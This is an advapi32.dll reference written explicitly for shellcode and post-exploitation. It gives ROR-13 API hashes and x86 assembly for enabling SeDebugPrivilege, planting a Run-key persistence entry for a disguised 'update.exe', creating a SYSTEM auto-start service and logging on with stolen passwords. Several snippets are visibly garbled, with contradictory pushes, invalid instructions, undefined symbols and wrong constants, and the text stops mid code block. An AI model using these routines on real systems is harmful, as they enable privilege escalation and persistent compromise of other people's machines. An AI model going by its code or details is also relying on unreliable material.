# advapi32.dll — Advanced API Reference for Shellcode and Post-Exploitation

**DLL:** `advapi32.dll`
**Base path:** `C:\Windows\System32\advapi32.dll`
**Calling convention (x86):** `__stdcall` — callee cleans the stack; arguments pushed right-to-left.
**Calling convention (x64):** `__fastcall` — first four args in `RCX`, `RDX`, `R8`, `R9`.
**Relevant shellcode types:** Privilege escalation, token manipulation, registry persistence, service installation, credential abuse, cryptographic operations.

> Cross-references: `kernel32.md` (GetCurrentProcess, CloseHandle, OpenProcess, CreateProcessA), `ntdll.md` (PEB walk, low-level token/privilege access via Nt* functions).

---

## Table of Contents

1. [advapi32.dll Availability and Loading](#advapi32dll-availability-and-loading)
2. [ROR-13 Hash Reference](#ror-13-hash-reference)
3. [Function Reference](#function-reference)
   - [OpenProcessToken](#openprocesstoken)
   - [LookupPrivilegeValueA](#lookupprivilegevaluea)
   - [AdjustTokenPrivileges](#adjusttokenprivileges)
   - [RegOpenKeyExA](#regopenkeya)
   - [RegQueryValueExA](#regqueryvalueexa)
   - [RegSetValueExA](#regsetvalueexa)
   - [RegCloseKey](#regclosekey)
   - [OpenSCManagerA](#openscmanagera)
   - [CreateServiceA](#createservicea)
   - [StartServiceA](#startservicea)
   - [CryptAcquireContextA](#cryptacquirecontexta)
   - [CryptGenRandom](#cryptgenrandom)
   - [LogonUserA](#logonusera)
   - [ImpersonateLoggedOnUser](#impersonateloggedonuser)
4. [Privilege Escalation Pattern: Enable SeDebugPrivilege](#privilege-escalation-pattern-enable-sedebugprivilege)
5. [Registry Persistence Pattern](#registry-persistence-pattern)
6. [Service-Based Persistence Pattern](#service-based-persistence-pattern)
7. [Calling Convention Notes](#calling-convention-notes)
8. [Common Mistakes and Pitfalls](#common-mistakes-and-pitfalls)

---

## advapi32.dll Availability and Loading

Unlike `ws2_32.dll` (which must be loaded explicitly in most processes), **`advapi32.dll` is a core Windows DLL** loaded by default in virtually every user-mode process. You do not need to call `LoadLibraryA` before resolving its exports.

**Verifying in WinDbg:**

```
0:000> lm m advapi32
Browse full module list
start    end        module name
74c10000 74d0b000   ADVAPI32   (deferred)
```

```
0:000> lm m advapi32 v
Browse full module list
start    end        module name
74c10000 74d0b000   ADVAPI32   (pdb symbols)
    Image path: C:\Windows\SysWOW64\advapi32.dll
    Image name: ADVAPI32.dll
    ...
```

**Finding advapi32.dll via PEB walk:**

The PEB walk (as used in the `block_api` Metasploit stub) iterates over the `InLoadOrderModuleList` in the PEB. `advapi32.dll` is typically the 4th–6th entry (position varies by OS version and loaded modules), but the hash-based resolver finds it by computing the module name hash and matching, so the position does not matter.

```nasm
; The block_api stub (from kernel32.md / ntdll.md) handles advapi32 automatically.
; Simply push the function hash and call EBP — the stub walks all loaded modules.

push 0xFB8F85E6        ; hash for OpenProcessToken (in advapi32)
call ebp               ; block_api finds advapi32 in the PEB module list
; EAX = address of OpenProcessToken
```

**Important on modern Windows (Windows 8+):** Many `advapi32.dll` functions are actually forwarded to `sechost.dll`, `kernelbase.dll`, or `ntdll.dll`. The block_api stub handles forwarded exports, so this is transparent to the shellcode writer.

---

## ROR-13 Hash Reference

| Function | ROR-13 Hash |
|---|---|
| `OpenProcessToken` | `0xFB8F85E6` |
| `LookupPrivilegeValueA` | `0xE60A0FEB` |
| `AdjustTokenPrivileges` | `0x3A8C5FF1` |
| `RegOpenKeyExA` | `0xC3B52E05` |
| `RegQueryValueExA` | `0x9DA68D33` |
| `RegSetValueExA` | `0x08B4D40E` |
| `RegCloseKey` | `0x7E43B3B0` |
| `OpenSCManagerA` | `0x98167B4B` |
| `CreateServiceA` | `0xDFC3B6B9` |
| `StartServiceA` | `0xD28E9B5A` |
| `CryptAcquireContextA` | `0x8A23A01E` |
| `CryptGenRandom` | `0x3B4EFAE6` |
| `LogonUserA` | `0xCF68EE84` |
| `ImpersonateLoggedOnUser` | `0xA64EA254` |

**Python hash computation:**

```python
def ror13(v): return ((v >> 13) | (v << 19)) & 0xFFFFFFFF
def hash_name(name):
    h = 0
    for c in name:
        h = ror13(h)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

funcs = ["OpenProcessToken","LookupPrivilegeValueA","AdjustTokenPrivileges",
         "RegOpenKeyExA","RegQueryValueExA","RegSetValueExA"]
for f in funcs:
    print(f"  {f}: {hex(hash_name(f))}")
```

---

## Function Reference

### OpenProcessToken

**Prototype:**

```c
BOOL OpenProcessToken(
    HANDLE  ProcessHandle,  // [in]  process whose token to open
    DWORD   DesiredAccess,  // [in]  requested access rights
    PHANDLE TokenHandle     // [out] receives the token handle
);
```

**Purpose:** Opens the access token associated with a process. Required before calling `AdjustTokenPrivileges` or `ImpersonateLoggedOnUser`. The returned token handle must be closed with `CloseHandle` (see `kernel32.md`) when no longer needed.

**Key parameters:**

| Parameter | Type | Typical value | Notes |
|---|---|---|---|
| `ProcessHandle` | `HANDLE` | `-1 (0xFFFFFFFF)` | `GetCurrentProcess()` pseudo-handle |
| `DesiredAccess` | `DWORD` | `0x0020` (`TOKEN_ADJUST_PRIVILEGES`) | Use `0xF01FF` (`TOKEN_ALL_ACCESS`) for full access |
| `TokenHandle` | `PHANDLE` | stack address | Receives the opened token handle |

**Access right constants:**

```c
#define TOKEN_ASSIGN_PRIMARY     0x0001
#define TOKEN_DUPLICATE          0x0002
#define TOKEN_IMPERSONATE        0x0004
#define TOKEN_QUERY              0x0008
#define TOKEN_QUERY_SOURCE       0x0010
#define TOKEN_ADJUST_PRIVILEGES  0x0020
#define TOKEN_ADJUST_GROUPS      0x0040
#define TOKEN_ADJUST_DEFAULT     0x0080
#define TOKEN_ADJUST_SESSIONID   0x0100
#define TOKEN_ALL_ACCESS         0x000F01FF
```

For the `SeDebugPrivilege` escalation pattern, `TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY` = `0x0028` is sufficient. Shellcode often uses `TOKEN_ALL_ACCESS (0xF01FF)` to keep things simple.

**Return value:**
- Non-zero (TRUE) on success; `TokenHandle` is populated.
- `0` (FALSE) on failure; call `GetLastError` for details.

**x86 push sequence:**

```nasm
; Reserve space on stack for the token handle output
sub  esp, 4            ; allocate HANDLE variable
mov  ebx, esp          ; EBX = &hToken

push ebx               ; TokenHandle = &hToken
push 0x0028            ; DesiredAccess = TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
push 0xFFFFFFFF        ; ProcessHandle = GetCurrentProcess() pseudo-handle (-1)
push 0xFB8F85E6        ; hash for OpenProcessToken
call ebp               ; EAX = nonzero on success
; [ebx] = hToken (the opened token handle)
mov  ecx, [ebx]        ; ECX = hToken
```

**ROR-13 hash:** `0xFB8F85E6`

---

### LookupPrivilegeValueA

**Prototype:**

```c
BOOL LookupPrivilegeValueA(
    LPCSTR lpSystemName,  // [in]  NULL = local system
    LPCSTR lpName,        // [in]  privilege name string
    PLUID  lpLuid         // [out] receives the LUID
);
```

**Purpose:** Retrieves the locally-unique identifier (LUID) for a privilege name on a given system. LUIDs are per-boot unique identifiers — they can change across reboots, so you cannot hardcode a LUID; you must look it up at runtime.

**Key parameters:**

| Parameter | Type | Value | Notes |
|---|---|---|---|
| `lpSystemName` | `LPCSTR` | `NULL` | Local system |
| `lpName` | `LPCSTR` | `"SeDebugPrivilege"` | Or any other privilege name |
| `lpLuid` | `PLUID` | stack address | Receives 8-byte LUID |

**Common privilege name strings:**

```c
"SeDebugPrivilege"          // debug processes (needed for OpenProcess on SYSTEM procs)
"SeImpersonatePrivilege"    // impersonate tokens (common in service exploits)
"SeAssignPrimaryTokenPrivilege" // assign primary tokens
"SeTcbPrivilege"            // act as part of OS
"SeShutdownPrivilege"       // shut down system
"SeLoadDriverPrivilege"     // load/unload kernel drivers
"SeCreateTokenPrivilege"    // create access tokens
```

**LUID layout (8 bytes):**

```c
typedef struct _LUID {
    DWORD LowPart;   // +0x00  lower 32 bits of the LUID
    LONG  HighPart;  // +0x04  upper 32 bits (usually 0 for well-known privileges)
} LUID;
```

**Return value:**
- Non-zero (TRUE) on success.
- `0` (FALSE) on failure (e.g., `ERROR_NO_SUCH_PRIVILEGE`).

**x86 push sequence:**

```nasm
; Reserve 8 bytes for LUID output
sub  esp, 8
mov  edx, esp          ; EDX = &luid

; Push "SeDebugPrivilege\x00" string onto the stack (null-byte-free approach)
; "SeDebugPrivilege" = 53 65 44 65 62 75 67 50 72 69 76 69 6C 65 67 65 00
xor  eax, eax
push eax               ; null terminator
push 0x65676976        ; "vige" (reversed)
push 0x696C6547        ; "Geli" (reversed: "iGel" → actually need careful ordering)
; Simplest approach: push the string as a series of DWORDs in reverse:
; "SeDebugPrivilege\x00" in memory (left to right):
;   53 65 44 65 62 75 67 50  72 69 76 69 6C 65 67 65  00
; Reversed into DWORDs pushed right-to-left on stack:
xor  eax, eax
push eax               ; 00 (+ 3 bytes padding to align... use push + adjust)
; Cleaner with a small helper:
; Store the string inline in shellcode and reference it via a call/pop technique,
; or use the following DWORD sequence:
push 0x00656765        ; "\x00ege" — has null byte! Use XOR encode
; XOR-encode "SeDebugPrivilege\x00":
; Each DWORD XOR'd with 0x01010101 to remove nulls, then patched at runtime.
; For brevity, in non-null-constrained contexts:
push 0x00000000        ; terminator (padding)
push 0x65676576        ; "vege" (bytes: 76 65 67 65) — "ege\x76" reversed
; This inline string approach is error-prone. Use call/pop instead:
jmp  short priv_string_end
priv_string:
    db "SeDebugPrivilege", 0
priv_string_end:
call priv_string - $ - 5  ; call pushes next address; jmp over string
pop  ecx               ; ECX = pointer to "SeDebugPrivilege\x00"

push edx               ; lpLuid = &luid
push ecx               ; lpName = "SeDebugPrivilege"
xor  eax, eax
push eax               ; lpSystemName = NULL
push 0xE60A0FEB        ; hash for LookupPrivilegeValueA
call ebp               ; EAX = nonzero on success
; [edx] = LUID.LowPart, [edx+4] = LUID.HighPart
```

**ROR-13 hash:** `0xE60A0FEB`

---

### AdjustTokenPrivileges

**Prototype:**

```c
BOOL AdjustTokenPrivileges(
    HANDLE            TokenHandle,         // [in]  token (from OpenProcessToken)
    BOOL              DisableAllPrivileges, // [in]  FALSE to modify specific privileges
    PTOKEN_PRIVILEGES NewState,            // [in]  pointer to TOKEN_PRIVILEGES struct
    DWORD             BufferLength,        // [in]  size of PreviousState buffer
    PTOKEN_PRIVILEGES PreviousState,       // [out] NULL (don't save previous state)
    PDWORD            ReturnLength         // [out] NULL
);
```

**Purpose:** Enables, disables, or removes privileges in a token. Used in post-exploitation to gain `SeDebugPrivilege` (allows `OpenProcess` on SYSTEM-owned processes), `SeImpersonatePrivilege` (token impersonation), or other elevated privileges.

**`TOKEN_PRIVILEGES` structure layout:**

```c
typedef struct _TOKEN_PRIVILEGES {
    DWORD               PrivilegeCount;      // +0x00  number of entries in Privileges[]
    LUID_AND_ATTRIBUTES Privileges[1];       // +0x04  array of privilege entries
} TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES {
    LUID  Luid;           // +0x00  8 bytes: the privilege LUID
    DWORD Attributes;     // +0x08  4 bytes: SE_PRIVILEGE_ENABLED etc.
} LUID_AND_ATTRIBUTES;
// Total size for one privilege: 4 + 8 + 4 = 16 bytes
```

**`Attributes` values:**

```c
#define SE_PRIVILEGE_ENABLED_BY_DEFAULT  0x00000001
#define SE_PRIVILEGE_ENABLED             0x00000002  // enable the privilege
#define SE_PRIVILEGE_REMOVED             0x00000004  // remove the privilege
#define SE_PRIVILEGE_USED_FOR_ACCESS     0x80000000
```

To enable a privilege: `Attributes = SE_PRIVILEGE_ENABLED (0x2)`.
To disable a privilege: `Attributes = 0`.
To remove a privilege: `Attributes = SE_PRIVILEGE_REMOVED (0x4)`.

**Key parameters:**

| Parameter | Type | Value | Notes |
|---|---|---|---|
| `TokenHandle` | `HANDLE` | from `OpenProcessToken` | Must have `TOKEN_ADJUST_PRIVILEGES` |
| `DisableAllPrivileges` | `BOOL` | `FALSE (0)` | Use `NewState` to set specific privs |
| `NewState` | `PTOKEN_PRIVILEGES` | `&tp` on stack | Points to `TOKEN_PRIVILEGES` struct |
| `BufferLength` | `DWORD` | `0` | Size of `PreviousState` buffer; 0 if `PreviousState=NULL` |
| `PreviousState` | `PTOKEN_PRIVILEGES` | `NULL` | Don't save previous state |
| `ReturnLength` | `PDWORD` | `NULL` | Not needed |

**Return value:**
- Non-zero (TRUE) on success — but **check `GetLastError` even on success**.
- If `GetLastError() == ERROR_NOT_ALL_ASSIGNED (0x514)`, the privilege is not held by the token and cannot be enabled (common in restricted accounts).
- `0` (FALSE) on hard failure.

> **Important:** `AdjustTokenPrivileges` can return TRUE while only partially succeeding. Always check `GetLastError` after a TRUE return to detect `ERROR_NOT_ALL_ASSIGNED`.

**x86 push sequence (enable SeDebugPrivilege):**

```nasm
; Assumes:
;   ECX = hToken (from OpenProcessToken)
;   EDX = &luid  (8-byte LUID from LookupPrivilegeValueA)
;
; Build TOKEN_PRIVILEGES on the stack:
;   [esp+0]  = PrivilegeCount = 1
;   [esp+4]  = Privileges[0].Luid.LowPart  (from LUID lookup)
;   [esp+8]  = Privileges[0].Luid.HighPart (from LUID lookup)
;   [esp+12] = Privileges[0].Attributes = SE_PRIVILEGE_ENABLED (2)

push 2                 ; Attributes = SE_PRIVILEGE_ENABLED
push dword [edx+4]     ; Luid.HighPart
push dword [edx]       ; Luid.LowPart
push 1                 ; PrivilegeCount = 1
mov  edx, esp          ; EDX = &TOKEN_PRIVILEGES

; Call AdjustTokenPrivileges
xor  eax, eax
push eax               ; ReturnLength = NULL
push eax               ; PreviousState = NULL
push eax               ; BufferLength = 0
push edx               ; NewState = &TOKEN_PRIVILEGES
push eax               ; DisableAllPrivileges = FALSE
push ecx               ; TokenHandle = hToken
push 0x3A8C5FF1        ; hash for AdjustTokenPrivileges
call ebp               ; EAX = nonzero on success (check GetLastError too)
```

**ROR-13 hash:** `0x3A8C5FF1`

---

### RegOpenKeyExA

**Prototype:**

```c
LONG RegOpenKeyExA(
    HKEY    hKey,        // [in]  predefined key or open key handle
    LPCSTR  lpSubKey,    // [in]  subkey path string
    DWORD   ulOptions,   // [in]  0 (reserved)
    REGSAM  samDesired,  // [in]  desired access rights
    PHKEY   phkResult    // [out] receives open key handle
);
```

**Purpose:** Opens a registry key for reading, writing, or both. Returns a handle used in subsequent `RegQueryValueExA`, `RegSetValueExA`, etc. calls. Must be closed with `RegCloseKey`.

**Predefined key handles:**

```c
#define HKEY_CLASSES_ROOT                0x80000000
#define HKEY_CURRENT_USER                0x80000001
#define HKEY_LOCAL_MACHINE               0x80000002
#define HKEY_USERS                       0x80000003
#define HKEY_PERFORMANCE_DATA            0x80000004
#define HKEY_CURRENT_CONFIG              0x80000005
```

These constants have the high bit set — they are not real kernel handles; the registry APIs handle them specially.

**`samDesired` access mask values:**

```c
#define KEY_QUERY_VALUE        0x0001
#define KEY_SET_VALUE          0x0002
#define KEY_CREATE_SUB_KEY     0x0004
#define KEY_ENUMERATE_SUB_KEYS 0x0008
#define KEY_NOTIFY             0x0010
#define KEY_CREATE_LINK        0x0020
#define KEY_WOW64_32KEY        0x0200  // force 32-bit registry view
#define KEY_WOW64_64KEY        0x0100  // force 64-bit registry view
#define KEY_READ               0x20019 // STANDARD_RIGHTS_READ | KEY_QUERY_VALUE |
                                       // KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY
#define KEY_WRITE              0x20006 // STANDARD_RIGHTS_WRITE | KEY_SET_VALUE |
                                       // KEY_CREATE_SUB_KEY
#define KEY_ALL_ACCESS         0xF003F
```

**Return value:**
- `ERROR_SUCCESS (0)` on success; `phkResult` contains the open key handle.
- A non-zero Win32 error code on failure (e.g., `ERROR_FILE_NOT_FOUND (2)` if the key does not exist).

> Note: Unlike most Win32 functions, registry functions return the error code directly (like `WSAStartup`) rather than via `GetLastError`. However, `GetLastError` may also reflect the error.

**x86 push sequence (open `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`):**

```nasm
; Reserve space for the output key handle
sub  esp, 4
mov  edi, esp          ; EDI = &hkResult

; Path string: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\x00"
; Use call/pop or inline string technique (see LookupPrivilegeValueA for pattern)
; For simplicity with call/pop:
jmp  short reg_path_end
reg_path:
    db "SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0
reg_path_end:
call reg_path - $ - 5
pop  ebx               ; EBX = pointer to path string

push edi               ; phkResult = &hkResult
push 0x00020019        ; samDesired = KEY_READ (0x20019) — note: has nulls, use register
; XOR-safe KEY_READ:
xor  eax, eax
mov  ax, 0x0019
or   eax, 0x00020000   ; EAX = 0x20019
push eax               ; samDesired = KEY_READ
xor  eax, eax
push eax               ; ulOptions = 0
push ebx               ; lpSubKey = path string
push 0x80000002        ; hKey = HKEY_LOCAL_MACHINE
push 0xC3B52E05        ; hash for RegOpenKeyExA
call ebp               ; EAX = 0 (ERROR_SUCCESS) on success
; [edi] = opened key handle
mov  esi, [edi]        ; ESI = hKey for further operations
```

**ROR-13 hash:** `0xC3B52E05`

---

### RegQueryValueExA

**Prototype:**

```c
LONG RegQueryValueExA(
    HKEY    hKey,         // [in]     open key handle
    LPCSTR  lpValueName,  // [in]     value name string (NULL = default value)
    LPDWORD lpReserved,   // [in]     NULL (reserved)
    LPDWORD lpType,       // [out]    receives value type (can be NULL)
    LPBYTE  lpData,       // [out]    receives value data (can be NULL for size query)
    LPDWORD lpcbData      // [in/out] on input: buffer size; on output: data size
);
```

**Purpose:** Retrieves data for a registry value. Used in shellcode to read configuration, persistence locations, or sensitive data (e.g., saved credentials, license keys in `HKLM`).

**Registry value type constants:**

```c
#define REG_NONE                    0
#define REG_SZ                      1   // null-terminated string
#define REG_EXPAND_SZ               2   // expandable string (with %ENVVAR%)
#define REG_BINARY                  3   // binary data
#define REG_DWORD                   4   // 32-bit DWORD
#define REG_DWORD_LITTLE_ENDIAN     4   // same as REG_DWORD
#define REG_DWORD_BIG_ENDIAN        5   // 32-bit big-endian DWORD
#define REG_LINK                    6   // symbolic link
#define REG_MULTI_SZ                7   // sequence of null-terminated strings
#define REG_QWORD                   11  // 64-bit QWORD
```

**Two-call pattern (query size, then query data):**

```c
// First call: get required data size
DWORD cbData = 0;
RegQueryValueExA(hKey, "ProductName", NULL, NULL, NULL, &cbData);
// cbData now holds the number of bytes needed

// Second call: read the data
BYTE buffer[256];
RegQueryValueExA(hKey, "ProductName", NULL, NULL, buffer, &cbData);
```

In shellcode, a pre-allocated stack buffer is typically used, skipping the size-query call.

**Return value:**
- `ERROR_SUCCESS (0)` on success.
- `ERROR_MORE_DATA (234)` if the buffer is too small.
- Other Win32 error codes on failure.

**x86 push sequence:**

```nasm
; Assumes ESI = open registry key handle from RegOpenKeyExA
; Read value "ProductName" from the key

sub  esp, 256          ; allocate 256-byte data buffer on stack
mov  edi, esp          ; EDI = data buffer
sub  esp, 4            ; allocate DWORD for cbData
mov  ebx, esp
mov  dword [ebx], 256  ; cbData = buffer size

; value name string "ProductName\x00"
jmp  short qval_end
qval_name:
    db "ProductName", 0
qval_end:
call qval_name - $ - 5
pop  ecx               ; ECX = "ProductName"

push ebx               ; lpcbData = &cbData
push edi               ; lpData = data buffer
xor  eax, eax
push eax               ; lpType = NULL (don't care about type)
push eax               ; lpReserved = NULL
push ecx               ; lpValueName = "ProductName"
push esi               ; hKey = open key handle
push 0x9DA68D33        ; hash for RegQueryValueExA
call ebp               ; EAX = 0 on success, data in [edi]
```

**ROR-13 hash:** `0x9DA68D33`

---

### RegSetValueExA

**Prototype:**

```c
LONG RegSetValueExA(
    HKEY        hKey,        // [in] open key handle (writable)
    LPCSTR      lpValueName, // [in] value name
    DWORD       Reserved,    // [in] 0 (reserved)
    DWORD       dwType,      // [in] value type (REG_SZ, REG_DWORD, etc.)
    const BYTE *lpData,      // [in] pointer to data
    DWORD       cbData       // [in] size of data in bytes
);
```

**Purpose:** Creates or replaces a registry value. Primary use in shellcode: **persistence** via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (see Persistence Pattern section).

**Key parameters for persistence (REG_SZ string value):**

| Parameter | Value | Notes |
|---|---|---|
| `hKey` | open `HKCU\...\Run` handle | From `RegOpenKeyExA` with `KEY_SET_VALUE` |
| `lpValueName` | `"MyApp"` | The value name (appears in Run key) |
| `Reserved` | `0` | Always 0 |
| `dwType` | `REG_SZ (1)` | Null-terminated string |
| `lpData` | `"C:\\payload.exe"` | Path to the executable |
| `cbData` | `strlen(path) + 1` | Include null terminator |

**Return value:**
- `ERROR_SUCCESS (0)` on success.
- Win32 error code on failure (e.g., `ERROR_ACCESS_DENIED (5)` if insufficient privileges).

**x86 push sequence (write a REG_SZ persistence entry):**

```nasm
; Assumes ESI = writable handle to HKCU\...\CurrentVersion\Run
; Write: "Updater" = "C:\Windows\Temp\update.exe"

; Data string: "C:\Windows\Temp\update.exe\x00"
jmp  short rset_end
rset_data:
    db "C:\Windows\Temp\update.exe", 0
rset_name:
    db "Updater", 0
rset_end:
call rset_data - $ - 5  ; trampoline for data string
pop  ebx               ; EBX = pointer to data string
call rset_name - $ - 5  ; trampoline for name string  
pop  ecx               ; ECX = pointer to value name "Updater"

; Calculate cbData = strlen(data) + 1
push edi               ; save EDI
mov  edi, ebx
xor  eax, eax
mov  ecx_saved, ecx    ; save ECX
xor  ecx, ecx
dec  ecx               ; ECX = 0xFFFFFFFF
repne scasb            ; scan for null: ZF set when found
not  ecx               ; ECX = length + 1 (includes null terminator)
pop  edi

push ecx               ; cbData = strlen + 1
push ebx               ; lpData = "C:\Windows\Temp\update.exe"
push 1                 ; dwType = REG_SZ
xor  eax, eax
push eax               ; Reserved = 0
; restore and push lpValueName
push [saved_value_name_ptr]  ; lpValueName = "Updater"
push esi               ; hKey = open key handle
push 0x08B4D40E        ; hash for RegSetValueExA
call ebp               ; EAX = 0 on success
```

**ROR-13 hash:** `0x08B4D40E`

---

### RegCloseKey

**Prototype:**

```c
LONG RegCloseKey(
    HKEY hKey   // [in] handle to close
);
```

**Purpose:** Closes an open registry key handle. Analogous to `CloseHandle` for regular handles (see `kernel32.md`). Failure to call this leaks the handle, which matters in long-running payloads.

**Return value:**
- `ERROR_SUCCESS (0)` on success.
- Non-zero error code on failure.

**x86 push sequence:**

```nasm
push esi               ; hKey = open key handle
push 0x7E43B3B0        ; hash for RegCloseKey
call ebp               ; EAX = 0 on success
```

**ROR-13 hash:** `0x7E43B3B0`

---

### OpenSCManagerA

**Prototype:**

```c
SC_HANDLE OpenSCManagerA(
    LPCSTR lpMachineName,   // [in] NULL = local machine
    LPCSTR lpDatabaseName,  // [in] NULL = SERVICES_ACTIVE_DATABASE
    DWORD  dwDesiredAccess  // [in] access rights
);
```

**Purpose:** Opens a handle to the Service Control Manager (SCM) database. Required before calling `CreateServiceA` or any other service management function. The returned `SC_HANDLE` is used in subsequent SCM calls.

**Access rights:**

```c
#define SC_MANAGER_CONNECT             0x0001
#define SC_MANAGER_CREATE_SERVICE      0x0002
#define SC_MANAGER_ENUMERATE_SERVICE   0x0004
#define SC_MANAGER_LOCK                0x0008
#define SC_MANAGER_QUERY_LOCK_STATUS   0x0010
#define SC_MANAGER_MODIFY_BOOT_CONFIG  0x0020
#define SC_MANAGER_ALL_ACCESS          0xF003F
```

**Return value:**
- Non-NULL `SC_HANDLE` on success.
- `NULL` on failure; call `GetLastError` for details.

> **Privilege requirement:** Creating services requires `SeCreateServicePrivilege` or administrator rights. Opening the SCM with `SC_MANAGER_ALL_ACCESS` from a non-elevated process returns `ERROR_ACCESS_DENIED (5)`.

**x86 push sequence:**

```nasm
push 0x003F00F0        ; SC_MANAGER_ALL_ACCESS = 0xF003F — use XOR to avoid null bytes
; XOR-free approach:
xor  eax, eax
mov  eax, 0xF003F
push eax               ; dwDesiredAccess = SC_MANAGER_ALL_ACCESS
xor  eax, eax
push eax               ; lpDatabaseName = NULL
push eax               ; lpMachineName = NULL
push 0x98167B4B        ; hash for OpenSCManagerA
call ebp               ; EAX = SC_HANDLE or NULL
mov  edi, eax          ; EDI = hSCManager
```

**ROR-13 hash:** `0x98167B4B`

---

### CreateServiceA

**Prototype:**

```c
SC_HANDLE CreateServiceA(
    SC_HANDLE hSCManager,        // [in]  SCM handle from OpenSCManagerA
    LPCSTR    lpServiceName,     // [in]  internal service name (registry key name)
    LPCSTR    lpDisplayName,     // [in]  display name (shown in services.msc)
    DWORD     dwDesiredAccess,   // [in]  SERVICE_ALL_ACCESS = 0xF01FF
    DWORD     dwServiceType,     // [in]  SERVICE_WIN32_OWN_PROCESS = 0x10
    DWORD     dwStartType,       // [in]  SERVICE_AUTO_START = 0x2
    DWORD     dwErrorControl,    // [in]  SERVICE_ERROR_NORMAL = 0x1
    LPCSTR    lpBinaryPathName,  // [in]  path to service executable
    LPCSTR    lpLoadOrderGroup,  // [in]  NULL
    LPDWORD   lpdwTagId,         // [out] NULL
    LPCSTR    lpDependencies,    // [in]  NULL
    LPCSTR    lpServiceStartName,// [in]  NULL = LocalSystem
    LPCSTR    lpPassword         // [in]  NULL = no password
);
```

**Purpose:** Creates a new service in the SCM database. Used for persistence (auto-start service) or privilege escalation (service runs as SYSTEM).

**Key parameter values:**

| Parameter | Value | Constant |
|---|---|---|
| `dwDesiredAccess` | `0xF01FF` | `SERVICE_ALL_ACCESS` |
| `dwServiceType` | `0x10` | `SERVICE_WIN32_OWN_PROCESS` |
| `dwStartType` | `0x2` | `SERVICE_AUTO_START` |
| `dwErrorControl` | `0x1` | `SERVICE_ERROR_NORMAL` |
| `lpServiceStartName` | `NULL` | Runs as `LocalSystem` |

**Return value:**
- Non-NULL `SC_HANDLE` to the new service on success.
- `NULL` on failure (`ERROR_SERVICE_EXISTS (1073)` if the service name already exists).

**ROR-13 hash:** `0xDFC3B6B9`

---

### StartServiceA

**Prototype:**

```c
BOOL StartServiceA(
    SC_HANDLE hService,           // [in] service handle from CreateServiceA/OpenServiceA
    DWORD     dwNumServiceArgs,   // [in] number of arguments
    LPCSTR   *lpServiceArgVectors // [in] argument array (NULL if none)
);
```

**Purpose:** Starts a service. After `CreateServiceA`, the service is not running until `StartServiceA` is called (unless system restarts and the auto-start service launches automatically).

**Return value:**
- Non-zero (TRUE) on success (service start request accepted).
- `0` (FALSE) on failure.

**x86 push sequence:**

```nasm
; Assumes EBX = service handle from CreateServiceA
xor  eax, eax
push eax               ; lpServiceArgVectors = NULL
push eax               ; dwNumServiceArgs = 0
push ebx               ; hService
push 0xD28E9B5A        ; hash for StartServiceA
call ebp
```

**ROR-13 hash:** `0xD28E9B5A`

---

### CryptAcquireContextA

**Prototype:**

```c
BOOL CryptAcquireContextA(
    HCRYPTPROV *phProv,          // [out] receives CSP handle
    LPCSTR      szContainer,     // [in]  NULL = default container
    LPCSTR      szProvider,      // [in]  NULL = default provider
    DWORD       dwProvType,      // [in]  PROV_RSA_FULL = 1
    DWORD       dwFlags          // [in]  CRYPT_VERIFYCONTEXT = 0xF0000000
);
```

**Purpose:** Acquires a handle to a Cryptographic Service Provider (CSP). Required before calling `CryptGenRandom`. In shellcode contexts, this is used to generate unpredictable nonces, session keys, or to introduce entropy into the payload.

**Key parameters:**

| Parameter | Value | Notes |
|---|---|---|
| `dwProvType` | `PROV_RSA_FULL (1)` | General-purpose RSA/AES CSP |
| `dwFlags` | `CRYPT_VERIFYCONTEXT (0xF0000000)` | Ephemeral keys; no key storage; no container needed |

`CRYPT_VERIFYCONTEXT` is the most important flag for shellcode — it avoids creating or opening a key container (which would require the user profile to be loaded and might fail in SYSTEM context).

**Return value:**
- Non-zero (TRUE) on success; `phProv` receives the CSP handle.
- `0` (FALSE) on failure.

**x86 push sequence:**

```nasm
sub  esp, 4
mov  ebx, esp          ; EBX = &hProv

push 0xF0000000        ; dwFlags = CRYPT_VERIFYCONTEXT
push 1                 ; dwProvType = PROV_RSA_FULL
xor  eax, eax
push eax               ; szProvider = NULL
push eax               ; szContainer = NULL
push ebx               ; phProv = &hProv
push 0x8A23A01E        ; hash for CryptAcquireContextA
call ebp               ; EAX = nonzero on success
mov  esi, [ebx]        ; ESI = hProv
```

**ROR-13 hash:** `0x8A23A01E`

---

### CryptGenRandom

**Prototype:**

```c
BOOL CryptGenRandom(
    HCRYPTPROV hProv,  // [in]     CSP handle from CryptAcquireContextA
    DWORD      dwLen,  // [in]     number of random bytes to generate
    BYTE      *pbBuffer // [in/out] buffer to receive random bytes
);
```

**Purpose:** Generates cryptographically random bytes. Used in shellcode for:
- Generating a random key for payload encryption/decryption.
- Creating a unique mutex name to prevent double-execution.
- Generating a random port/IP for callback jitter.
- XOR key generation for in-memory decryption stubs.

**Return value:**
- Non-zero (TRUE) on success; `pbBuffer` filled with random bytes.
- `0` (FALSE) on failure.

**x86 push sequence:**

```nasm
; Assumes ESI = hProv from CryptAcquireContextA
sub  esp, 16           ; allocate 16-byte random buffer
mov  edi, esp          ; EDI = &randomBuffer

push edi               ; pbBuffer
push 16                ; dwLen = 16 bytes of randomness
push esi               ; hProv
push 0x3B4EFAE6        ; hash for CryptGenRandom
call ebp               ; EAX = nonzero; [edi..edi+15] = random bytes
```

**ROR-13 hash:** `0x3B4EFAE6`

---

### LogonUserA

**Prototype:**

```c
BOOL LogonUserA(
    LPCSTR  lpszUsername,    // [in]  username
    LPCSTR  lpszDomain,      // [in]  domain or "." for local
    LPCSTR  lpszPassword,    // [in]  plaintext password
    DWORD   dwLogonType,     // [in]  LOGON32_LOGON_INTERACTIVE = 2
    DWORD   dwLogonProvider, // [in]  LOGON32_PROVIDER_DEFAULT = 0
    PHANDLE phToken          // [out] receives the user token
);
```

**Purpose:** Creates a new logon session for a specified user, returning an access token. Used in credential-based post-exploitation (pass-the-password), followed by `ImpersonateLoggedOnUser` or `CreateProcessAsUser` to run code as the authenticated user.

**Logon type constants:**

```c
